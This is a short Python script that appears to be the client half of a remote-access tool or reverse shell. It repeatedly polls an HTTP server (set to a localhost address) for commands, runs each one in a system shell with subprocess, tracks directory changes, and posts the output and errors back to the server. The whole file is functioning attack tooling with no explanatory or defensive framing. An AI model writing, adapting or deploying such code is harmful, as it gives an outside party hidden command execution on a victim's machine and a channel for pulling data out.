import requests
import os
import json
import subprocess


SERVER_IP = 'http://127.0.0.1:5000'
cwd = os.getcwd()


def send(output):
    requests.post(SERVER_IP + '/server/send', json=output)


def main():
    global cwd
    cmd = ''
    while True:
        try:
            cmd = json.loads(requests.post(SERVER_IP + '/server/recv', timeout=10).text)['command']
            if cmd == 'exit': requests.post(SERVER_IP + '/bye', timeout=10)
            if cmd.startswith('cd '):
                parts = cmd.split(maxsplit=1)
                new_path = os.path.abspath(os.path.join(cwd, parts[1]))
                if os.path.isdir(new_path):
                    cwd = new_path
                    send({'output': '', 'error': None, "cwd": cwd})
                else:
                    send({'output': None, "error": f"cd: path '{new_path}' was not found.", "cwd": cwd})
                continue
        except requests.exceptions.ReadTimeout:
            continue
        result = subprocess.run(cmd, shell=True, capture_output=True, cwd=cwd)
        output = result.stdout.decode()
        error = result.stderr.decode()
        output = output if output else None

        send({'error': error, 'output': output, 'cwd': cwd})


if __name__ == '__main__':
    main()